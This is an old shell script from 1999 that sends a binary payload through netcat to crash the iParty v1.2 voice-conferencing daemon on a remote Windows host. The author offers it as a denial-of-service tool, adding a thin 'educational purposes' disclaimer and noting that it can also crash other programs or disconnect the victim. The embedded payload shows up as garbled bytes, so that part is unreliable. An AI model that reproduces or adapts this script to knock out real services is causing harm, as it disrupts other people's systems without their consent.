#!/bin/sh
# iParty Pooper by Ka-wh00t (wh00t@iname.com) - early May '99 - Created out of pure boredom.
# iParty is a cute little voice conferencing program still widely used (much to my surprise.)
# Unfortuneately, the daemon, that's included in the iParty download, can be shut down remotely.
# And in some circumstances, this can lead to other Windows screw-ups (incidents included internet
# disconnection, ICQ GPFs, Rnaapp crashes, etc.) Sometimes the daemon closes quietly, other
times
# a ipartyd.exe GPF. DoSers will hope for the GPF. At time of this script's release, the latest
# (only?) version of iParty/iPartyd was v1.2
# FOR EDUCATIONAL PURPOSES ONLY.


if [ "$1" = "" ]; then
echo "Simple Script by Ka-wh00t to kill any iParty Server v1.2 and under. (ipartyd.exe)"
echo "In some circumstances can also crash other Windows progs and maybe even Windows itself."
echo "Maybe you'll get lucky."
echo ""
echo "Usage: $0 <hostname/ip> <port>"
echo "Port is probably 6004 (default port)."
echo ""
echo "Remember: You need netcat for this program to work."
echo "If you see something similar to 'nc: command not found', get netcat."
else
if [ "$2" = "" ]; then
echo "I said the port is probably 6004, try that."
exit
else
rm -f ipp00p
cat > ipp00p << _EOF_
$6Ï]}tT’µ?"Ãêa?p/?H‘D?0iA·ΩL%œÃ?EBE‘Å'*}“y”‘•(3Íz?èn√uË‘èj+®∞(÷?÷?èd'??¯ÅZiXÂÀy7°'``‡æΩœù	Cµ∂Ô¸÷ πÁÓ≥œﬁÁÏΩœ>Á‹êE¢6?‚^ﬂÓ^vØ?Ï^Ø:¬∆{n"uÌ£«'g=o®ß?8¬”Å'L5"ÔÈ≤±?ê·§Å∏DRG“IÙlq?Y≠g?ª“i?∆i’æÎHπH?w?Ú·Ω≤ª‘3l??*oŒ#ÈsC9m,

_EOF_
echo ""
echo "Sending kill..."
cat ipp00p | nc $1 $2
echo "Done."
rm -f ipp00p
fi
fi
